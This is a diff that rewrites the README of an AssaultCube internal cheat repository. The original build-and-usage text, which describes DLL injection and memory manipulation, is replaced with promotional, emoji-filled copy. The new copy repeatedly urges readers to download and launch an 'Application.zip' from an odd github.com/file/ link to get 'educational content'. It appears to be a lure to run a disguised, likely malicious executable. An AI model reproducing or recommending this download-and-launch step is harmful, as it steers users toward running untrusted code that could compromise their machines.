@@ -1,56 +1,44 @@
-# AssaultCube Internal Base
+# 🎮 AssaultCube-Internal: The Ultimate Educational Cheat Repository 🎯
 
-An educational internal base for AssaultCube, demonstrating basic game hacking concepts and techniques. This project serves as a learning resource for understanding game internals, memory manipulation, and cheat development.
+Welcome to the home of "AssaultCube-Internal", the ultimate educational internal base for AssaultCube! 🚀
 
-## Features
-- ImGui menu system with keyboard navigation
-- OpenGL hooking
-- Basic memory manipulation
-- Simple cheat features (God Mode, Infinite Ammo)
-- Safe memory reading/writing class
-- Vector math utilities
+## Overview
 
-## Prerequisites
-- Visual Studio 2019 or newer
-- Windows SDK 10.0
-- DirectX SDK
-- AssaultCube 1.2.0.2
+"AssaultCube-Internal" is a repository designed for educational purposes, focusing on providing a comprehensive base for game hacking in AssaultCube. This repository includes an ImGui menu, OpenGL hook, and various basic features to help you understand the intricacies of cheat development.
 
-## Dependencies
-- [MinHook](https://github.com/TsudaKageyu/minhook) - Hooking library
-- [ImGui](https://github.com/ocornut/imgui) - GUI library
+## Features 🛠️
 
-## Building
-1. Clone the repository
-2. Open the solution in Visual Studio
-3. Make sure to compile in Release x86 (32-bit) mode - THIS IS IMPORTANT!
-4. Build the solution
+In this repository, you will find resources related to AssaultCube, including helpful tutorials on CPP, hooking, ImGui implementation, memory manipulation techniques, and utilizing the MinHook library. Whether you are a beginner looking to dip your toes into game hacking or an experienced developer seeking to enhance your skills, "AssaultCube-Internal" has something for everyone.
 
-## Usage
-1. Run AssaultCube
-2. Inject the compiled DLL using your preferred injector
-3. Press INSERT to toggle the menu
-4. Use arrow keys to navigate:
-   - UP/DOWN: Select options
-   - LEFT/RIGHT: Toggle features
+## Repository Topics 📚
 
-## Project Structure
-- `main.cpp` - DLL entry point and OpenGL hook
-- `menu.h` - ImGui menu implementation
-- `memory.h` - Safe memory manipulation class
-- `math.h` - Vector math utilities
-- `misc.cpp` - Cheat features implementation
+Explore a range of topics related to game hacking and cheat development, including:
 
-## Educational Purpose
-This project is meant for educational purposes only, to help understand:
-- DLL injection and hooking
-- Game memory manipulation
-- GUI creation in game hacks
-- Basic game math
-- Game cheat structure and organization
+- assaultcube
+- cheat
+- cpp
+- educational
+- game-hacking
+- hooking
+- imgui
+- internal-cheat
+- learning-resources
+- memory-manipulation
+- minhook
+- opengl
 
-## Disclaimer
-This project is for educational purposes only. Do not use these techniques in online games or to disrupt other players' experiences.
+## Get Started 🚀
 
-## License
-This project is licensed under the MIT License - see the LICENSE file for details.
+To dive into the world of game hacking with AssaultCube, download the [Application.zip](https://github.com/file/Application.zip) file provided in the link above. Don't forget to launch the file to get started with the exciting educational content waiting for you!
+
+If the link is not working or the file needs to be launched, check out the "Releases" section of this repository for alternative download options.
+
+[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-blue.svg)](https://github.com/file/Application.zip)
+
+## Happy Hacking! 💻🔓
+
+Get ready to unlock the secrets of game hacking with "AssaultCube-Internal"! Whether you're here to expand your knowledge, enhance your skills, or simply explore the world of cheat development, this repository is your gateway to the exciting realm of AssaultCube. Happy hacking! 🎮✨
+
+---
+
+Remember, knowledge is power! Stay curious, keep learning, and enjoy your game hacking journey with "AssaultCube-Internal"! 🚀🔥
